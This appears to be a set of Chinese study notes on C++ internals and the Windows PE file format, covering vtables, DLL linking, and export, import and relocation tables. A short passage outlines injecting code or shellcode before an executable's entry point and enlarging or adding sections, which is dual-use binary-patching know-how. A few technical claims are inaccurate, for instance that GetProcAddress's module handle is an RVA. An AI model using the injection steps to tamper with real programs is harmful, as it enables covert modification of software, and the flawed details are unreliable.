多继承无函数覆盖\nstruct Base1 { public: virtual void Fn_1() { printf(\"Base1:Fn_1...\\n\"); } virtual void Fn_2() { printf(\"Base1:Fn_2...\\n\"); } }; struct Base2 { public: virtual void Fn_3() { printf(\"Base2:Fn_3...\\n\"); } virtual void Fn_4() { printf(\"Base2:Fn_4...\\n\"); } }; struct Sub:Base1,Base2 { public: virtual void Fn_5() { printf(\"Sub:Fn_5...\\n\"); } virtual void Fn_6() { printf(\"Sub:Fn_6...\\n\"); } }; 多继承有函数覆盖\nstruct Base1 { public: virtual void Fn_1() { printf(\"Base1:Fn_1...\\n\"); } virtual void Fn_2() { printf(\"Base1:Fn_2...\\n\"); } }; struct Base2 { public: virtual void Fn_3() { printf(\"Base2:Fn_3...\\n\"); } virtual void Fn_4() { printf(\"Base2:Fn_4...\\n\"); } }; struct Sub:Base1,Base2 { public: virtual void Fn_1() { printf(\"Sub:Fn_1...\\n\"); } virtual void Fn_3() { printf(\"Sub:Fn_3...\\n\"); } virtual void Fn_5() { printf(\"Sub:Fn_5...\\n\"); } }; 多重继承无函数覆盖\nstruct Base1 { public: virtual void Fn_1() { printf(\"Base1:Fn_1...\\n\"); } virtual void Fn_2() { printf(\"Base1:Fn_2...\\n\"); } }; struct Base2:Base1 { public: virtual void Fn_3() { printf(\"Base2:Fn_3...\\n\"); } virtual void Fn_4() { printf(\"Base2:Fn_4...\\n\"); } }; struct Sub:Base2 { public: virtual void Fn_5() { printf(\"Sub:Fn_5...\\n\"); } virtual void Fn_6() { printf(\"Sub:Fn_6...\\n\"); } }; 多重继承有函数覆盖\nstruct Base1 { public: virtual void Fn_1() { printf(\"Base1:Fn_1...\\n\"); } virtual void Fn_2() { printf(\"Base1:Fn_2...\\n\"); } }; struct Base2:Base1 { public: virtual void Fn_1() { printf(\"Base2:Fn_1...\\n\"); } virtual void Fn_3() { printf(\"Base2:Fn_3...\\n\"); } }; struct Sub:Base2 { public: virtual void Fn_5() { printf(\"Sub:Fn_5...\\n\"); } }; 多重继承有函数覆盖\nstruct Base1 { public: virtual void Fn_1() { printf(\"Base1:Fn_1...\\n\"); } virtual void Fn_2() { printf(\"Base1:Fn_2...\\n\"); } }; struct Base2:Base1 { public: virtual void Fn_1() { printf(\"Base2:Fn_1...\\n\"); } virtual void Fn_3() { printf(\"Base2:Fn_3...\\n\"); } }; struct Sub:Base2 { public: virtual void Fn_1() { printf(\"Sub:Fn_1...\\n\"); } virtual void Fn_5() { printf(\"Sub:Fn_5...\\n\"); } }; 多重继承有函数覆盖\nstruct Base1 { public: virtual void Fn_1() { printf(\"Base1:Fn_1...\\n\"); } virtual void Fn_2() { printf(\"Base1:Fn_2...\\n\"); } }; struct Base2:Base1 { public: virtual void Fn_3() { printf(\"Base2:Fn_3...\\n\"); } }; struct Sub:Base2 { public: virtual void Fn_1() { printf(\"Sub:Fn_1...\\n\"); } virtual void Fn_3() { printf(\"Sub:Fn_3...\\n\"); } }; 大概总结：\n在没有覆盖下情况下，继承父类的虚函数在虚表中会在开始添加（上父下子） 有覆盖的话，谁最后覆盖就在虚表中写谁的虚函数 多一个直接继承的父类，就多一张虚表 动态绑定 绑定：就是将函数调用与地址关联起来\n前期绑定：就是在编译时已经把函数的地址写死了（E8直接Call） 后期绑定 / 动态绑定 / 运行期绑定：就是在程序运行时才确定函数的调用（FF间接Call） 在c++中动态绑定是通过虚表实现的，只有virtual函数是动态绑定的\n多态 == 动态绑定\n定义：一种类型体现出不同行为（就比如父类的指针访问子类的方法）\n如何实现的呢？：在调用函数时call [ebx]形成间接调用，并没有写死调用地址，便有了多态。\n模板 就是自己的函数只能处理一种类型的数据，使用模板后编译器会替你生成对应类型的函数。相同类型的代码使用模板与不使用模板在汇编界面看是完全相同的，只是编译器做的类型转换。\n函数模板的格式：\ntemplate \u003cclass形参名, class形参名, ......\u003e返回类型函数名(参数列表) { //函数体 } 类模板的格式为：\ntemplate\u003cclass形参名, class形参名, ......\u003e class类名 { } 引用 当程序中有值不需要再被重新赋值，就可以使用引用\nvoid Test(int\u0026 x) { x = 1; //\u0026x = 20; //不能重新赋值，x的类型是指针 } int main() { int a = 2; Test(a); } 特点：\n引用类型是C++里面的类型，必须赋初始值 引用类型只能赋值一次，不能重新赋值（不允许再指向其他的值，“从一而终”） 引用只是变量的一个别名 引用可以理解成是编译器维护的一个指针，但并不占用空间（就是与指针相比，在汇编的角度下是完全相等的） 使用引用可以像指针那样去访问、修改对象的内容，但更加安全 加const之后为常引用，不可改引用的值。 友元 就是向面向过程的妥协\n友元函数：\nfriend void Printobject(Cobject* pobject); 告诉编译器，这个函数是我的朋友，可以访问我的任何成员！\n友元类：\nfriend class TestFriend(类名称) TestFriend类中的函数（方法）都可以直接访问这个类中的私有成员，但只是单向的。\n什么情况下需要友元函数：\n运算符重载的某些场合需要使用友元 两个类要共享数据的时候 友元函数和类的成员函数的区别\n成员函数有this指针，而友元函数没有this指针 友元函数是不能被继承的，就像父亲的朋友未必是儿子的朋友 运算符重载 就是重新定义运算符，让它有新的含义（有点儿像给运算符宏定义一下）。其实就是声明一个函数，然后在特定位置调用它\nvoid operator ++() { //…… } x++ 总结\n运算符重载就是函数替换 . :: ?: sizeof # 不能重载 new与delete 基本函数：\nmalloc函数：\nmalloc -\u003e _nh_malloc_dbg -\u003e _heap_alloc_dbg -\u003e _heap_alloc_base -\u003e HeapAlloc new函数：\n_nh_malloc -\u003e _nh_malloc_dbg -\u003e _heap_alloc_dbg -\u003e _heap_alloc_base -\u003e HeapAlloc free函数：\nfree -\u003e _free_dbg -\u003e _free_base -\u003e HeapFree delete函数:\n_free_dbg -\u003e _free_base -\u003e HeapFree 关系：\nnew = malloc + 构造函数\ndelete = free+析构函数\ndelete p是只删除一个堆块，delete[] p是将所有的堆块全部删除（都执行析构函数）\n用法：\nint* pi = new int[10]; delete[] pi; Person* p = new Person[2]; delete[] p; 对象拷贝 拷贝构造函数的调用：\nCObject x(1,2); \u003c1\u003e CObject y(x); \u003c2\u003e CObject *p= new CObject(x); 就是相当于y就是x的一个副本，本质是内存的复制。 只复制成员的值，不复制成员是指针时指针指向的值 内部类 将一个类定义到另一个类里面，定义时需要在内部类前面写上外部类的名字。\n外部类与内部类的关系：\n彼此没有特权,互相独立 内部类受protected/private影响 命名空间 符号::​是作用域的符号，A::B​为B属于A\nnamespace n1 { ...... } namespace n2 { ...... } 如果函数在全局命名空间那么::Test​可以调用\nstatic关键词 面向过程：\nstatic char szBuffer[0x10]={0} 被static修饰的变量（在函数内定义的）转变为**私有的全局变量，**既只能供当前函数使用的全局变量。\n面向对象：\n在类中创建的static变量：只是这个类可以访问到的全局变量，这个类的大小不会因为static变量而改变（你仅仅只有访问和使用权，它不是你的）\n单子模式\n有些时候我们希望定义的某些类只能有一个对象存在（因为一个对象就已经足够了），该如何进行限制呢？实现思路：\n禁止对象随便被创建 保证对象只有一份存在 总结：\n出现在类体外的函数定义不能指定关键字static; 静态成员之间可以相互访问，包括静态成员函数访问静态数据成员和访问静态成员函数； 非静态成员函数可以任意地访问静态成员函数和静态数据成员； 静态成员函数不能访问非静态成员函数和非静态数据成员； 调用类的静态成员函数的两种方式 数据结构 Vector [ 元素1 ] [ 元素2 ] [ ... ] [ 元素n ] [ 空闲空间1 ] [ ... ] [ 空闲空间n ] 相当于是动态是数组 本质就是一个数组 可以动态扩充容量 支持下标方法，查询性能好 新增数据和删除数据较差（因为要将后面所有的数据向前或向后移动） 链表 结构：\ngraph LR A[Head] --\u003e B(数据:地址) B --\u003e C(数据:地址) C --\u003e D(数据:地址) D --\u003e E[Null] style A fill:#333,stroke:#333,stroke-width:2px style E fill:#333,stroke:#333,stroke-width:2px 特点：\n数据分散存储 查询性能没有Vector好 新增与删除的性能好于Vector 二叉树 结构：\ngraph TD A[根节点] --\u003e B[左子节点] A --\u003e C[右子节点] B --\u003e D[左孙子节点] B --\u003e E[右孙子节点] C --\u003e F[左孙子节点] C --\u003e G[右孙子节点] 其实就是链表中的地址有两个，分别指向不同的下一个链表\n遍历:\nA / \\ B C / \\ / \\ D E F G （ 根 -\u003e 左 -\u003e 右）前序遍历的顺序就是： A -\u003e B -\u003e D -\u003e E -\u003e C -\u003e F -\u003e G （左 -\u003e 根 -\u003e 右）中序遍历的顺序就是： D -\u003e B -\u003e E -\u003e A -\u003e F -\u003e C -\u003e G （左 -\u003e 右 -\u003e 根）后序遍历的顺序就是： D -\u003e E -\u003e B -\u003e F -\u003e G -\u003e C -\u003e A 搜索二叉树 graph TD A[15] --\u003e B[5] A --\u003e C[16] B --\u003e D[3] B --\u003e E[12] C --\u003e F[NULL] C --\u003e G[20] E --\u003e H[10] E --\u003e I[13] G --\u003e J[18] G --\u003e K[23] H --\u003e L[6] H --\u003e M[NULL] 就是左子节点比父节点小，右子节点比父节点大 特点： 有很好的查询性能 有很好的新增和删除的性能 若左子树不空，则左子树上所有结点的值均小于它的根结点的值 若右子树不空，则右子树上所有结点的值均大于它的根结点的值 左、右子树也分别为二叉排序树 搜索二叉树的删除 叶子节点 删除该节点 将父节点（左或者右）指针置NULL 只有一个子树 删除该节点 将父节点（左或者右）指针指向子树 左右子树都有 用右子树最小的节点取代源节点 再递归删除最小节点（就是把这个节点的子节点再连接到这个节点的父节点上） "},"title":"Windows BAS"},"/docs/windows/windows-beg/":{"data":{"":"","#":"PE文件结构 总体结构 ​​\n程序在内存中是分节的，每一个节存储不同的数据，硬盘对齐(200h)，内存对齐(1000h)。因为程序在硬盘上和内存中的状态可能略有不同(以前的程序在内存中与在硬盘上，在内存中节与节之间会有一个\"拉伸\"过程，节与节之间的空隙变大(填充0)。而现在的程序则并不会。)，这样做可以:\n节省硬盘空间。 实现多开(将只读的节保留，将可读可写的节多开，可以节省内存空间)。 头的大致结构如下：\n结构 DOS头 标准PE头 可选PE头 节表 结构解释：\nDOS头（IMAGE_DOS_HEADER）最早是为16位的DOS程序设计的，因此包含了一些与DOS相关的信息。现代的Windows可执行文件（PE格式）仍然保留了DOS头，以便在DOS环境下运行时能显示“此程序不能在DOS模式下运行”的消息。DOS头的第一个字段是WORD e_magic，通常为0x5A4D，即字符“MZ”，用于标识这是一个有效的DOS可执行文件头。另一个重要字段是DWORD e_lfanew，它保存了PE头（IMAGE_NT_HEADERS）在文件中的偏移量。程序在解析PE文件时，会从e_lfanew字段找到PE头的位置。值得注意的是，在e_lfanew和PE标识符（“PE”，即0x5045）之间的部分数据通常被认为是“垃圾数据”，这些数据在现代Windows系统中没有实际用途，只是为了保持文件结构的兼容性。\n1、DOS头：\tWORD e_magic *\t\"MZ标记\" 用于判断是否为可执行文件.\tDWORD e_lfanew; *\tPE头相对于文件的偏移，用于定位标准PE头 在找到PE标识符“PE\\0\\0”（0x50450000）后，接下来就是（IMAGE_NT_HEADERS）NT头的内容。\ntypedef struct _IMAGE_NT_HEADERS { DWORD Signature; // 文件签名，通常为'PE\\0\\0'（0x00004550），用于标识这是一个有效的PE文件 IMAGE_FILE_HEADER FileHeader; // 标准PE头，包含文件的基本信息 IMAGE_OPTIONAL_HEADER OptionalHeader; // 可选PE头，包含加载和运行时的详细信息 } IMAGE_NT_HEADERS, *PIMAGE_NT_HEADERS; 文件签名紧随其后的是FileHeader（IMAGE_FILE_HEADER），通常被称为标准PE头或COFF头，包含文件的基本信息。\n2、标准PE头：\tWORD Machine; *\t程序运行的CPU型号：0x0 任何处理器/0x14C 386及后续处理器\tWORD NumberOfSections; *\t文件中存在的节的总数,如果要新增节或者合并节 就要修改这个值.\tDWORD TimeDateStamp; *\t时间戳：文件的创建时间(和操作系统的创建时间无关)，编译器填写的.\tDWORD PointerToSymbolTable; DWORD NumberOfSymbols; WORD SizeOfOptionalHeader; *\t可选PE头的大小，32位PE文件默认E0h 64位PE文件默认为F0h 大小可以自定义.\tWORD Characteristics; *\t每个位有不同的含义，可执行文件值为10F 即0 1 2 3 8位置1 Characteristics 标志位如下：\n标号 Characteristics 标志位 属性 0 IMAGE_FILE_RELOCS_STRIPPED 重定位信息已被剥离，意味着文件中不包含重定位信息 1 IMAGE_FILE_EXECUTABLE_IMAGE 文件是可执行的，可以作为应用程序直接运行 2 IMAGE_FILE_LINE_NUMS_STRIPPED 行号信息已被剥离，意味着文件中不包含行号信息 3 IMAGE_FILE_LOCAL_SYMS_STRIPPED 符号信息已被剥离，意味着文件中不包含局部符号信息 4 IMAGE_FILE_AGGRESIVE_WS_TRIM 调整工作集，优化内存使用 5 IMAGE_FILE_LARGE_ADDRESS_AWARE 应用程序可以处理大于 2GB 的地址空间 6 此标志位保留，没有特定的属性 7 IMAGE_FILE_BYTES_REVERSED_LO 字节顺序反转（低字节序），文件采用小尾方式存储数据 8 IMAGE_FILE_32BIT_MACHINE 只在 32 位平台上运行 9 IMAGE_FILE_DEBUG_STRIPPED 不包含调试信息 10 IMAGE_FILE_REMOVABLE_RUN_FROM_SWAP 不能从可移动盘运行 11 IMAGE_FILE_NET_RUN FROM_SWAP 不能从网络运行 12 IMAGE_FILE_SYSTEM 系统文件（如驱动程序),不能直接运行 13 IMAGE_FILE_DLL 这是一个 DLL 文件 14 IMAGE_FILE_UP_SYSTEM_ONLY 文件不能在多处理器计算机上运行 15 IMAGE_FILE_BYTES_REVERSED_HI 大尾方式 紧接着，就是可选(扩展)PE头(IMAGE_OPTIONAL_HEADER):\n3、可选PE头：\tWORD Magic; *\t说明文件类型：10B 32位下的PE文件 20B 64位下的PE文件\tBYTE MajorLinkerVersion; BYTE MinorLinkerVersion; DWORD SizeOfCode;*\t所有代码节的和，必须是FileAlignment的整数倍 编译器填的 没用\tDWORD SizeOfInitializedData;*\t已初始化数据大小的和,必须是FileAlignment的整数倍 编译器填的 没用\tDWORD SizeOfUninitializedData;*\t未初始化数据大小的和,必须是FileAlignment的整数倍 编译器填的 没用\tDWORD AddressOfEntryPoint;*\t程序入口\tDWORD BaseOfCode;*\t代码开始的基址，编译器填的 没用\tDWORD BaseOfData;*\t数据开始的基址，编译器填的 没用\tDWORD ImageBase;*\t内存镜像基址\tDWORD SectionAlignment;*\t内存对齐\tDWORD FileAlignment;*\t文件对齐\tWORD MajorOperatingSystemVersion;\tWORD MinorOperatingSystemVersion;\tWORD MajorImageVersion;\tWORD MinorImageVersion;\tWORD MajorSubsystemVersion;\tWORD MinorSubsystemVersion;\tDWORD Win32VersionValue;\tDWORD SizeOfImage;*\t内存中整个PE文件的映射的尺寸，可以比实际的值大，但必须是SectionAlignment的整数倍\tDWORD SizeOfHeaders;*\t所有头+节表按照文件对齐后的大小，否则加载会出错\tDWORD CheckSum;*\t校验和，一些系统文件有要求.用来判断文件是否被修改.\tWORD Subsystem;\tWORD DllCharacteristics;\tDWORD SizeOfStackReserve;*\t初始化时保留的堆栈大小 DWORD SizeOfStackCommit;*\t初始化时实际提交的大小 DWORD SizeOfHeapReserve;*\t初始化时保留的堆大小 DWORD SizeOfHeapCommit;*\t初始化时实践提交的大小 DWORD LoaderFlags;\tDWORD NumberOfRvaAndSizes;*\t目录项数目 DllCharacteristics属性如下：\n标志位 DllCharacteristics属性 说明 0 Reserved 必须为0 1 Reserved 必须为0 2 Reserved 必须为0 3 Reserved 必须为0 4 null null 5 null null 6 IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE DLL可以在加载时被重定位 7 IMAGE_DLLCHARACTERISTICS_FORCE_INTEGRITY 强制代码实施完整性验证 8 IMAGE_DLLCHARACTERISTICS_NX_COMPAT 该映像兼容 DEP 9 IMAGE_DLLCHARACTERISTICS_NO_ISOLATION 可以隔离，但并不隔离此映像 10 IMAGE_DLLCHARACTERISTICS_NO_SEH 没有结构化异常处理（SEH） 11 IMAGE_DLLCHARACTERISTICS_NO_BIND 不绑定映像 12 Reserved 必须为0 13 IMAGE_DLLCHARACTERISTICS_WDM_DRIVER 该映像为一个 WDM driver 14 Reserved 必须为0 15 IMAGE_DLLCHARACTERISTICS_TERMINAL SERVER_AWARE 可用于终端服务器 最后就是节表\n如果节相当于书里面的内容，那么节表就相当于书的目录。之前的什么DOS头之类的结构就相当于书的出版社什么的信息。 typedef struct _IMAGE_SECTION_HEADER { BYTE Name[IMAGE_SIZEOF_SHORT_NAME]; // 节的名称，长度为8个字节。通常是以\"\\0\"结尾的ASCII字符串，但系统会截取8个字节的内容。名称可以自定义。 union { DWORD PhysicalAddress; // 在COFF格式中用于指示物理地址。对于PE文件通常不使用。 DWORD VirtualSize; // 节的虚拟大小。在内存中的实际大小可以与SizeOfRawData不同。 } Misc;\t// 双字是该节在没有对齐前的真实尺寸,该值可以不准确。 DWORD VirtualAddress; // 节在内存中的虚拟地址，加上ImageBase才是内存中的实际地址。 DWORD SizeOfRawData; // 节在文件中的对齐后的大小。在文件中的实际大小。 DWORD PointerToRawData; // 节在文件中的偏移地址，指向节的实际数据。 DWORD PointerToRelocations; // 对于obj文件中的重定位信息使用。对于exe文件，通常为0。 DWORD PointerToLinenumbers; // 行号表的偏移，用于调试。对于exe文件，通常为0。 WORD NumberOfRelocations; // 在obj文件中使用，指示节中重定位的数量。对于exe文件，通常为0。 WORD NumberOfLinenumbers; // 行号表中行号的数量，用于调试。对于exe文件，通常为0。 DWORD Characteristics; // 节的属性标志，如是否为可执行代码、是否可读、是否可写等。 } IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;\t所以，节表的结构如下：\n完整如下：\n1、DOS头：\tWORD e_magic *\t\"MZ标记\" 用于判断是否为可执行文件.\tDWORD e_lfanew; *\tPE头相对于文件的偏移，用于定位PE文件\t2、标准PE头：\tWORD Machine; *\t程序运行的CPU型号：0x0 任何处理器/0x14C 386及后续处理器\tWORD NumberOfSections; *\t文件中存在的节的总数,如果要新增节或者合并节 就要修改这个值.\tDWORD TimeDateStamp; *\t时间戳：文件的创建时间(和操作系统的创建时间无关)，编译器填写的.\tDWORD PointerToSymbolTable; DWORD NumberOfSymbols; WORD SizeOfOptionalHeader; *\t可选PE头的大小，32位PE文件默认E0h 64位PE文件默认为F0h 大小可以自定义.\tWORD Characteristics; *\t每个位有不同的含义，可执行文件值为10F 即0 1 2 3 8位置1 3、可选PE头：\tWORD Magic; *\t说明文件类型：10B 32位下的PE文件 20B 64位下的PE文件\tBYTE MajorLinkerVersion; BYTE MinorLinkerVersion; DWORD SizeOfCode;*\t所有代码节的和，必须是FileAlignment的整数倍 编译器填的 没用\tDWORD SizeOfInitializedData;*\t已初始化数据大小的和,必须是FileAlignment的整数倍 编译器填的 没用\tDWORD SizeOfUninitializedData;*\t未初始化数据大小的和,必须是FileAlignment的整数倍 编译器填的 没用\tDWORD AddressOfEntryPoint;*\t程序入口\tDWORD BaseOfCode;*\t代码开始的基址，编译器填的 没用\tDWORD BaseOfData;*\t数据开始的基址，编译器填的 没用\tDWORD ImageBase;*\t内存镜像基址\tDWORD SectionAlignment;*\t内存对齐\tDWORD FileAlignment;*\t文件对齐\tWORD MajorOperatingSystemVersion;\tWORD MinorOperatingSystemVersion;\tWORD MajorImageVersion;\tWORD MinorImageVersion;\tWORD MajorSubsystemVersion;\tWORD MinorSubsystemVersion;\tDWORD Win32VersionValue;\tDWORD SizeOfImage;*\t内存中整个PE文件的映射的尺寸，可以比实际的值大，但必须是SectionAlignment的整数倍\tDWORD SizeOfHeaders;*\t所有头+节表按照文件对齐后的大小，否则加载会出错\tDWORD CheckSum;*\t校验和，一些系统文件有要求.用来判断文件是否被修改.\tWORD Subsystem;\tWORD DllCharacteristics;\tDWORD SizeOfStackReserve;*\t初始化时保留的堆栈大小 DWORD SizeOfStackCommit;*\t初始化时实际提交的大小 DWORD SizeOfHeapReserve;*\t初始化时保留的堆大小 DWORD SizeOfHeapCommit;*\t初始化时实践提交的大小 DWORD LoaderFlags;\tDWORD NumberOfRvaAndSizes;*\t目录项数目 PE加载的过程：\n根据SizeOfImage的大小，开辟一块缓冲区(ImageBuffer) 根据SizeOfHeader的大小，将头信息从FileBuffer拷贝到ImageBuffer 根据节表中的信息循环将FileBuffer中的节拷贝到ImageBuffer中 ‍RVA与FOA的转换 因为运行的程序全局变量的初始值在未运行的程序中也存在，所以我们如何通过运行程序的地址的值，来推出程序在未运行时这个值对应的地址。\n‍RVA相对虚拟地址\n‍RVA=address(程序运行时要找值的地址)-ImageBase\nFOA文件偏移地址(程序未运行要找的地址)\n对应关系(不过现在的程序运行和未运行是对齐都相等，所以直接FOA=RVA)：\n如果在头部(前面没有节的对齐) FOA=RVA\n不在头部(节内的差值是相同的)\nRVA \u003e=节.VirtualAddress RVA \u003c= 节.VirtualAddress + 当前节内存对齐后的大小 差值 = RVA - 节.VirtualAddress FOA =节.PointerToRawData +差值 实验：在编译好的程序执行前弹个窗口 汇编对应硬编码\n6A 00 ：push 0\tE8 跳转值 ：call 要跳转的地址\n计算要跳转地址的硬编码：\n跳转值=要跳转的地址-E8(call)指令当前的地址-5(对齐到下一个指令) 扩大节 当我们想添加的代码或者shellcode比较多，程序没地方写的话可以选择扩大节，由于对齐的原因，扩大最后一个节对其他节的影响最小，是最优选择\n扩大节的步骤：\n分配一块新的空间,大小为S\n将最后一个节的SizeOfRawData和VirtualSize改成N\nN = (SizeOfRawData或者VirtualSize内存对齐后的值) + S\n修改SizeOflmage大小\n新增节 新增节的步骤：\n判断是否有足够的空间,可以添加一个节表. 在节表中新增一个成员. 修改PE头中节的数量. 修改sizeOflmage的大小. 再原有数据的最后,新增一个节的数据(内存对齐的整数倍). 修正新增节表的属性. 静态链接库-动态链接库 静态链接库：\n将xxx.h和xxx.lib复制到要使用的项目中（就是你写的lib） 在需要使用的文件中包含：#include \"xxx.h\" 在需要使用的文件中包含：#pragma comment(lib, \"xxx.lib\")；或者改项目设置中的link将xxx.lib加入 使用静态链接库其实就是把你写的xxx.h文件里的函数全部编译到程序里面了，使用静态链接生成的可执行文件体积较大，造成浪费。\n动态链接库：\n隐式链接：（就是编译器替你去链接）\n将*.dll *.lib放到工程目录下面（主要功能在dll里面，这个lib其实就是告诉程序函数在哪里）\n将#pragma comment(lib,\"DLL名.lib\")添加到调用文件中\n加入函数的声明：\nextern \"C\" __declspec(dllimport) __stdcall int Plus (int x,int y); extern \"C\" __declspec(dllimport) __stdcall int Sub (int x,int y); extern \"C\" __declspec(dllimport) __stdcall int Mul (int x,int y); extern \"C\" __declspec(dllimport) __stdcall int Div (int x,int y); __declspec(dllimport)告诉编译器此函数为导入函数；\n__declspec(dllexport)告诉编译器此函数为导出函数；\nextern \"C\"的意思是用C语言的语法进行编译和链接，去掉的话函数名称后面会加乱码，作用是名称粉碎\n显示链接：（自己去链接）\n定义函数指针：\ntypedef int (__stdcall *lpPlus)(int,int); typedef int (__stdcall *lpSub)(int,int); typedef int (__stdcall *lpMul)(int,int); typedef int (__stdcall *lpDiv)(int,int); //定义新的类型 声明函数指针变量：\nlpPlus myPlus; lpSub mySub; lpMul myMul; lpDiv myDiv; 动态加载dll到内存中：\nHINSTANCE hModule = LoadLibrary(\"DllDemo.dll\"); 获取函数地址：\nmyPlus = (lpPlus)GetProcAddress(hModule, \"_Plus@8\"); mySub = (lpSub)GetProcAddress(hModule, \"_Sub@8\"); myMul = (lpMul)GetProcAddress(hModule, \"_Mul@8\"); myDiv = (lpDiv)GetProcAddress(hModule, \"_Div@8\"); //@后面的8是指后面有两个参数，一个参数4字节 调用函数：\nint a = myPlus(10,2); int b = mySub(10,2); int c = myMul(10,2); int d = myDiv(10,2); Handle是代表系统的内核对象，如文件句柄，线程句柄，进程句柄。其实就是操作系统分的一个文件编号，线程编号或者是进程编号。避免用户将句柄进行运算（unsign4字节）\nGetProcAddress的第一个参数hModule其实就是模块的RVA\n使用序号导出：\n*.h文件：\nint Plus (int x,int y); int Sub (int x,int y); int Mul (int x,int y); int Div (int x,int y); *.cpp文件：\nint Plus(int x,int y) { return x+y; } int Sub(int x,int y) { return x-y; } int Mul(int x,int y) { return x*y; } int Div(int x,int y) { return x/y;\t} *.def文件：\nEXPORTS Plus @12 Sub\t@15 NONAME Mul @13 Div @16 后面的数字就是函数的导出序号，NONAME指的是无名字，隐藏名称\n名字是一段程序就精华的注释,通过名字可以直接猜测到函数的功能，通过使用序号，可以达到隐藏的目的.\n导出表 一个程序是由多个配文件所组成，那么这个程序使用了哪些dll文件，会在一个表中记录，这就是导入表；同样的，有哪些程序使用了我这个程序的函数，也会记录在一个表内，这个表是导出表。\n如何找到导出表：pe文件结构中最后一个结构中的第一个结构体，那里存放着导出表的地址(rva)和大小(size)\n请注意，这个大小(size)指的是导出表中的指针指向的内容的和大小（比如name指针指向的字段以\\x00截至，等等的所有字段和加上固定的40个字节，只是编译器填的值，无实际意义）\nIMAGE_DIRECTORY_ENTRY_EXPORT struct_IMAGE_DATA_DIRECTORY { 0x00 DWORD VirtualAddress; 0x04 DWORD Size; } 通过这个地址就可以找到导出表，结构如下：\ntypedef struct _IMAGE_EXPORT_DIRECTORY { DWORD Characteristics; //未使用 DWORD TimeDateStamp; //时间戳 WORD MajorVersion; //未使用 WORD MinorVersion; //未使用 DWORD Name; //指向改导出表文件名字符串 DWORD Base; //导出表的起始序号 DWORD NumberOfFunctions; //导出函数的个数(更准确来说是AddressOfFunctions的元素数，而不是函数个数) DWORD NumberOfNames; //以函数名字导出的函数个数 DWORD AddressOfFunctions; //导出函数地址表RVA:存储所有导出函数地址(表元素宽度为4，总大小NumberOfFunctions * 4) DWORD AddressOfNames; //导出函数名称表RVA:存储函数名字符串所在的地址(表元素宽度为4，总大小为NumberOfNames * 4) DWORD AddressOfNameOrdinals; //导出函数序号表RVA:存储函数序号(表元素宽度为2，总大小为NumberOfNames * 2) } IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY; 1.导出的函数要么用名字导出，要么用序号导出(隐藏)，总数为NumberOfNames的值\n一共有三个表，地址表，序号表，名称表\n其中：序号表的数量与名称表的数量相同。\n比如：\n地址表 序号表(2字节) 名称表 addr1(knameA) 4 ADDR1(AAAA) addr2(knameB) 1 ADDR2(BBBB) addr3(knameC) 0 ADDR3(CCCC) 00000000 addr4(knameD) erDiagram Address_table { address addr1(knameA) address addr2(knameB) address addr3(knameC) address NULL address addr4(knameD) } Serial_number_table { number four number one number zero } Name_table { name ADDR1(AAAA) name ADDR2(BBBB) name ADDR3(CCCC) } 通过名字找函数时：（按照名称找函数地址）\ngraph RL AAAA --\u003e 4 --\u003e knameD 首先遍历名称表，比如找到名称AAAA函数，发现是表中的第0号成员。 通过①中的0直接查询序号表中的0号成员，发现是数字4 通过②中的4直接查找地址表中的第4号成员，为addr4(knameD)，所以knameD就是AAAA（从0开始数） 相反过程：（知道函数地址找函数名）\ngraph LR knameA --\u003e 0 --\u003e CCCC 比如知道函数的地址为addr1(knameA)，发现是地址表中的第0号成员。 通过①中的0直接查询序号表中的成员哪个是0，发现是第二个索引 直接对应名称表的第二个索引，所以ADDR3(CCCC)就是addr1(knameA) 通过序号找函数时：（按照序号找函数地址）\ngraph RL 4 --\u003e knameD 将导出序号减去导出表的起始序号(Base的值)。 将这个值直接对应地址表，就找到了。 序号表与名称表是对应的，地址表是靠序号表索引得到的\n重定位表 如果两个dll文件在导入内存时，导入在相同的ImageBase的偏移处，该怎么办？只需要修正其中一个dll文件的偏移在没有文件导入的内存偏移，即可。但这两个dll中的全局变量的硬编码可能会有相同的偏移。这时就需要使用重定位表了\n数据目录项的第6个结构，就是重定位表（相对于映像基址的偏移量）。\n结构如下：\ntypedef struct _IMAGE_BASE_RELOCATION { DWORD VirtualAddress; DWORD SizeOfBlock; //字节为单位 } IMAGE_BASE_RELOCATION; 这个结构体中的第二个成员SizeOfBlock是当前重定位块的总大小，就是加上VirtualAddress成员的大小。 当遇到全为\\x00时(8个)，说明已经结束了。 比如其中一个重定位块如下：\nVirtual Size 0011#### ######## 0011#### ######## 0011#### ######## 0011#### ######## 说明：Virtual代表VirtualAddress成员，Size(0x10)代表SizeOfBlock成员，#代表一位的数据，一个框代表一个字节。2^12=4096，即为一页对齐的数据，所以使用两个字节(16位其中的低12位)来存放地址，其中的高4位的作用是：当高4位的值为3(0011=3，不是3时就是垃圾！)时，说明该地址有意义重定位，应当重定位的值=VirtualAddress成员+低12位\n移动导出表，重定向表 在DLL中新增一个节，并返回新增后的FOA 复制AddressOfFunctions\t长度：4*NumberOfFunctions 复制AddressOfNameOrdinals\t长度：NumberOfNames*2 复制AddressOfNames\t长度：NumberOfNames*4 复制所有的函数名\t长度不确定，复制时直接修复AddressOfNames 复制IMAGE_EXPORT_DIRECTORY结构 修复IMAGE_EXPORT_DIRECTORY结构中的\tAddressOfFunctions\tAddressOfNameOrdinals\tAddressOfNames 修复目录项中的值，指向新的IMAGE_EXPORT_DIRECTORY 导入表 导入表就像程序的“借用清单”，告诉它运行时需要调用哪些外部函数以及从哪里找到它们。\n依赖一个模块就会有一个导入表，所以导入表有很多。 遇到连续20个\\x00说明导入表结束了 结构如下：\ntypedef struct_IMAGE_IMPORT_DESCRIPTOR union { DWORD Characteristics; DWORD OriginalFirstThunk;\t//RVA指向IMAGE_THUNK_DATA结构数组 }; DWORD TimeDateStamp;\t//时间戳 DWORD ForwarderChain; DWORD Name;\t//RVA,指向dl名字，该名字已0结尾 DWORD FirstThunk;\t//RVA,指向IMAGE_THUNK_DATA结构数组 }IMAGE_IMPORT_DESCRIPTOR; 其中:\nOriginalFirstThunk成员和FirstThunk成员又分别指向了INT（导入名称表）和IAT（导入地址表），这两张表位置和名称都不同，但内容却相同，都能找到函数名称。 当遇到全为\\x00时，说明已经结束了。 成员有多少个，该程序就使用了这个dll中的多少个函数。 typedef struct_IMAGE_THUNK_DATA32 union{ PBYTE ForwarderString; PDWORD Function; DWORD Ordinal;\t//序号 PIMAGE_IMPORT_BY_NAME AddressOfData; //指向IMAGE_IMPORT_BY_NAME }u1; 